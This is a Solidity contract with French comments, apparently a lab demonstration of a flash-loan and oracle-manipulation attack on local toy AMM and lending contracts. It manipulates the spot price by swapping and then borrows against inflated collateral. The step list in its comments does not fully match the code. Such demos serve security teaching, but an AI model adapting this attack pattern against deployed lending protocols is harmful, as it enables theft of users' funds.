// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {SimpleAMM} from "./SimpleAMM.sol";
import {LendingProtocol} from "./LendingProtocol.sol";

/**
 * @title FlashLoanAttacker
 * @notice Simule une attaque flash loan + manipulation d'oracle
 *
 *         Étapes :
 *         1. Reçoit un gros montant de tokenA (simule flash loan)
 *         2. Swap massif A→B → reserveA explose, reserveB chute
 *            → getSpotPrice() (reserveB/reserveA) s'effondre
 *         3. Dépose un peu de A comme collateral
 *         4. Emprunte B — le protocol sous-évalue le collateral
 *            MAIS la dette max = collateral * price / 150%
 *            Si price est manipulé à la HAUSSE de B/A :
 *            on fait swap B→A pour faire monter le prix de A
 *         5. Swap inverse pour récupérer les A
 *         6. Rembourse le "flash loan"
 *         7. Garde le profit en B
 */
contract FlashLoanAttacker {
    SimpleAMM       public amm;
    LendingProtocol public lending;
    address         public owner;

    event AttackExecuted(
        uint256 priceBefore,
        uint256 priceAfter,
        uint256 borrowed
    );

    constructor(address _amm, address _lending) {
        amm     = SimpleAMM(_amm);
        lending = LendingProtocol(_lending);
        owner   = msg.sender;
    }

    /**
    * @notice Execute l'attaque complète
    * @param collateralAmount montant de A déposé comme collateral
    */
    function attack(
        uint256 /* flashAmount */,
        uint256 collateralAmount
    )  external {
        require(msg.sender == owner, "Not owner");

        // Prix avant manipulation
        uint256 priceBefore = amm.getSpotPrice();

        // Étape 1 : swap massif B→A pour faire monter le prix de A
        // (on a reçu flashAmount de B via flash loan)
        uint256 attackerB = amm.balanceB(address(this));
        if (attackerB > 0) {
            amm.swapBtoA(attackerB);
        }

        // Prix après manipulation
        uint256 priceAfter = amm.getSpotPrice();

        // Étape 2 : dépose collateral A
        uint256 attackerA = amm.balanceA(address(this));
        require(attackerA >= collateralAmount, "Not enough A");
        lending.depositCollateral(collateralAmount);

        // Étape 3 : emprunte B au prix manipulé
        uint256 priceA    = amm.getSpotPrice();
        uint256 colVal    = (collateralAmount * priceA) / 1e18;
        uint256 maxBorrow = (colVal * 100) / 150;

        if (maxBorrow > 0) {
            lending.borrow(maxBorrow);
        }

        emit AttackExecuted(priceBefore, priceAfter, maxBorrow);
    }
}